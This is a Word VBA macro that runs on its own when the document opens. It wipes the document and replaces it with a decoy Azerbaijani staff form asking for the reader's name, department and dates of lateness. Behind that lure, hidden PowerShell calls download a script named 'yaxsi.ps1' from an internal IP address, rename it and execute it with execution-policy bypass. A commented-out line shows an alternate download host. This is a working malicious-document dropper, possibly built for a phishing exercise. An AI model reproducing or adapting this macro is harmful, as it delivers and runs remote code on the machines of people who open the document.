Sub Fun()
'
' Fun Macro
'
'

End Sub
Sub Document_Open()
    
    SubstitutePage
    MyMacro
End Sub
Sub AutoOpen()
    
    SubstitutePage
    MyMacro
End Sub
Sub SubstitutePage()
    ActiveDocument.Content.Select
    Selection.Delete
    
    InsertImage
    InsertTextAtEndOfDocument
    Set myRange = ActiveDocument.Paragraphs(6).Range
    With myRange.Font
    .Name = "Arial"
    .Size = 15
    End With
    Set myRange = ActiveDocument.Paragraphs(8).Range
    With myRange.Font
    .Name = "Arial"
    .Size = 15
    End With
    Set myRange = ActiveDocument.Paragraphs(10).Range
    With myRange.Font
    .Name = "Arial"
    .Size = 15
    End With
    Set myRange = ActiveDocument.Paragraphs(4).Range
    With myRange.Font
    .Name = "Arial"
    .Size = 15
    End With
    
    With ActiveDocument.Paragraphs(6).Borders(wdBorderBottom)
    .LineStyle = wdLineStyleSingle
    .LineWidth = wdLineWidth025pt
    End With
    
    With ActiveDocument.Paragraphs(8).Borders(wdBorderBottom)
    .LineStyle = wdLineStyleSingle
    .LineWidth = wdLineWidth025pt
    End With
    
    With ActiveDocument.Paragraphs(10).Borders(wdBorderBottom)
    .LineStyle = wdLineStyleSingle
    .LineWidth = wdLineWidth025pt
    End With
End Sub
Sub InsertTextAtEndOfDocument()
    ActiveDocument.Content.InsertAfter Text:="Ad, Soyad, Ata Adi:" & vbNewLine
    ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine
    ActiveDocument.Content.InsertAfter Text:="Chalishdiginiz shobe:" & vbNewLine
    ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine
    ActiveDocument.Content.InsertAfter Text:="Cari ayda ishe gecikdiyiniz gunlerin tarixi:" & vbNewLine
    ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine
End Sub
Sub InsertImage()
    Dim str1 As String
    str1 = "powershell new-item c:\dir3 -itemtype directory"
    Shell str1, vbHide
    Dim str2 As String
    str2 = "powershell Invoke-WebRequest 'http://10.145.1.16/logo.png' -OutFile C:\dir3\logo.png"
    Shell str2, vbHide
    
    Dim imagePath As String
    imagePath = "C:\dir3\logo.png"
    

    ActiveDocument.Shapes.AddPicture FileName:=imagePath, _
    LinkToFile:=False, _
    SaveWithDocument:=True, _
    Left:=-5, _
    Top:=5, _
    Anchor:=Selection.Range, _
    Width:=150, _
    Height:=50
    
    ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine
    ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine
    ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine
    ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine
    ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine

End Sub
Sub MyMacro()
    'MsgBox ("hello")
    Set objShell = CreateObject("Wscript.Shell")
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.145.1.16/yaxsi.ps1', 'yaxsi.ps1')"
    'str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.4/test.ps1', 'test.ps1')"
    Shell str, vbHide
    Dim docPath As String
    Dim exePath As String
    docPath = ActiveDocument.Path + "\yaxsi.ps1"
    Wait (2)
    Name docPath As ActiveDocument.Path + "\pis.ps1"
    exePath = ActiveDocument.Path + "\pis.ps1"
    'objShell.Run ("powershell.exe -ep bypass exePath"), 0
    Dim icra As String
    icra = "powershell -ep bypass" + exePath
    'MsgBox pwexec
    Shell icra, vbHide
End Sub
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub